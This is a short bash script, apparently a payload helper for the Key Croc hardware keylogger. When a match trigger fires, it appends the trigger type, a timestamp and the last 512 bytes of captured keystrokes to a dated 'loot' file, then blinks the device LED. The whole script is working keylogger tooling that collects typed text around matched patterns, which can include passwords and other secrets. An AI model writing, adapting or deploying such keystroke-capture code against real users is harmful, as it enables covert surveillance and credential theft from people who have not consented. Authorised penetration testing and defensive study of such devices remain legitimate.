#!/bin/bash
# ================================================================
#  Key Croc — log_match.sh
#  Description : Called by MATCH triggers. Appends match event and
#                surrounding keylog context to the loot file.
# ================================================================

LOOT_DIR=/loot/keylog-$(date +%Y%m%d)
mkdir -p "$LOOT_DIR"
HITS_FILE="${LOOT_DIR}/keylog_hits.txt"

MATCH_TYPE="${1:-UNKNOWN}"
TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)

# Capture recent keylog buffer if available
KEYLOG_BUFFER=""
if [ -f /tmp/croc_keylog_buffer ]; then
    KEYLOG_BUFFER=$(tail -c 512 /tmp/croc_keylog_buffer 2>/dev/null || true)
fi

{
    echo "──────────────────────────────────────────────"
    echo "Timestamp : $TIMESTAMP"
    echo "Trigger   : $MATCH_TYPE"
    [ -n "$KEYLOG_BUFFER" ] && echo "Context   : $KEYLOG_BUFFER"
    echo ""
} >> "$HITS_FILE"

# LED feedback
LED FINISH
sleep 1
LED OFF
